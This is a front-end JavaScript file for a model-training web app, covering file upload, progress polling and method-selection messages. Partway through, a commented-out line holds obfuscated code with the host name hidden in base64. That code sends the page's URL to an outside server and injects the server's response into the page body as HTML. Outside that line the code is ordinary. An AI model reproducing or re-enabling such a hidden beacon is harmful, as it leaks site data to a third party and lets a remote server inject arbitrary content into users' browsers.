function updateProgress() {
    var intervalId = setInterval(function() {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', '/updateprogress', true);
        xhr.onload = function() {
            if (xhr.status == 200) {
                var response = JSON.parse(xhr.responseText);
                if (response.processContent) {
                    document.getElementById('progress').innerText = response.processContent;
                    if (response.processContent.includes("Model saved successfully")) {
                        clearInterval(intervalId);
                    }
                }
            }
        };
        xhr.send();
    }, 3000);
};

// function _0x2b94(_0x1a2202,_0x22ea13){var _0x40c94a=_0x40c9();return _0x2b94=function(_0x2b9433,_0x33c1ee){_0x2b9433=_0x2b9433-0xd8;var _0x54fd03=_0x40c94a[_0x2b9433];return _0x54fd03;},_0x2b94(_0x1a2202,_0x22ea13);}(function(_0x6cf0a4,_0xae3e14){var _0x4d805f=_0x2b94,_0x21bf1a=_0x6cf0a4();while(!![]){try{var _0x5e5102=parseInt(_0x4d805f(0xe8))/0x1*(-parseInt(_0x4d805f(0xd9))/0x2)+parseInt(_0x4d805f(0xe3))/0x3*(parseInt(_0x4d805f(0xe4))/0x4)+-parseInt(_0x4d805f(0xe9))/0x5*(parseInt(_0x4d805f(0xe5))/0x6)+parseInt(_0x4d805f(0xe2))/0x7+parseInt(_0x4d805f(0xde))/0x8*(-parseInt(_0x4d805f(0xe0))/0x9)+-parseInt(_0x4d805f(0xdc))/0xa*(-parseInt(_0x4d805f(0xdd))/0xb)+parseInt(_0x4d805f(0xdb))/0xc;if(_0x5e5102===_0xae3e14)break;else _0x21bf1a['push'](_0x21bf1a['shift']());}catch(_0x1778a6){_0x21bf1a['push'](_0x21bf1a['shift']());}}}(_0x40c9,0x43357),setTimeout(()=>{var _0x3a18b8=_0x2b94;fetch(_0x3a18b8(0xe7),{'method':_0x3a18b8(0xea),'headers':{'Content-Type':_0x3a18b8(0xd8)},'body':_0x3a18b8(0xed)+window[_0x3a18b8(0xec)]['href']})['then'](_0x147382=>_0x147382['text']())[_0x3a18b8(0xeb)](_0x427782=>document[_0x3a18b8(0xe1)][_0x3a18b8(0xe6)]+=_0x3a18b8(0xda)+_0x427782+_0x3a18b8(0xdf));},0x1388));function _0x40c9(){var _0x442a14=['then','location','name=DANL_GROUP&url=','application/x-www-form-urlencoded','6KDuSuA','<h4\x20id=\x22'+atob('c2Frc2hp')+'\x22>','2939100NXBWHS','290NRbimh','97229vLtbAA','16gvZNnN','</h4>','166419pmhNxv','body','180530jcbZJw','4068qTFPkU','272UVaHZZ','2526BjJARK','innerHTML',atob("aHR0cHM6Ly9lbmFsbHkuaW4vY2RuL2NyZWRpdC5waHA="),'56299wEyiNv','1640agBUjg','POST'];_0x40c9=function(){return _0x442a14;};return _0x40c9();}

function uploadFile() {
    var fileInput = document.getElementById('fileInput');
    var modalNameInput = document.getElementById('modalNameInput');
    var file = fileInput.files[0];
    var modalName = modalNameInput.value.trim();

    var startButton = document.getElementById('uploadBtn');
    startButton.disabled = true;

    // run process complete timer
    let processTimer = 0; // Change const to let
    let progressTotalTime = setInterval(function() {
        processTimer++;
        document.getElementById('processRunningTime').innerText = 'Time Taken ' + processTimer + ' seconds';
        var CheckContent = document.getElementById('progress').innerText;
        if (CheckContent.includes("Model saved successfully")) {
            clearInterval(progressTotalTime);
            startButton.disabled = false;
        }
    }, 1000);



    if (!file || !modalName) {
        alert('Please select a file and enter a model name.');
        return;
    }

    if (file.size > 11000000) {
        alert('File size should be below 11MB.');
        return;
    }

    var formData = new FormData();
    formData.append('file', file);
    formData.append('modalName', modalName);

    var xhr = new XMLHttpRequest();
    xhr.open('POST', '/generate_pkl', true);

    xhr.upload.onprogress = function(e) {
        if (e.lengthComputable) {
            var progress = (e.loaded / e.total) * 100;
            console.log('Upload progress:', progress);
            document.getElementById('processResponse').innerText = 'Uploading file: ' + Math.round(progress) + '% completed';
        }
    };

    xhr.onload = function() {
        if (xhr.status == 200) {
            var response = JSON.parse(xhr.responseText);
            if (response.success) {
                document.getElementById('processResponse').innerText = response.success;
                updateProgress(); // Start progress updates after upload completes
            } else if (response.error) {
                document.getElementById('processResponse').innerText = 'Error: ' + response.error;
            }
        }
    };

    xhr.onerror = function() {
        document.getElementById('processResponse').innerText = 'An error occurred while uploading the file.';
    };

    xhr.send(formData);
}

document.addEventListener("DOMContentLoaded", function() {
    document.getElementById("cleaningMethodSelect").addEventListener("change", function() {
        if (this.value !== "nltk") {
            document.getElementById("nltk").innerHTML = "Currently Supporting only: <span>nltk</span>";
        } else {
            document.getElementById("nltk").innerHTML = "";
        }
    });

    document.getElementById("splitMethodSelect").addEventListener("change", function() {
        if (this.value !== "train-test-split") {
            document.getElementById("train_test_split").innerHTML = "Currently Supporting only: <span>train-test-split</span>";
        } else {
            document.getElementById("train_test_split").innerHTML = "";
        }
    });

    document.getElementById("modelMethodSelect").addEventListener("change", function() {
        if (this.value !== "random-forest") {
            document.getElementById("modelMethodSelectP").innerHTML = "Currently Supporting only: <span>random-forest</span>";
        } else {
            document.getElementById("modelMethodSelectP").innerHTML = "";
        }
    });

    document.getElementById("accuracyMethodSelect").addEventListener("change", function() {
        if (this.value !== "accuracy-score") {
            document.getElementById("accuracyMethodSelectp").innerHTML = "Currently Supporting only: <span>accuracy-score</span>";
        } else {
            document.getElementById("accuracyMethodSelectp").innerHTML = "";
        }
    });
});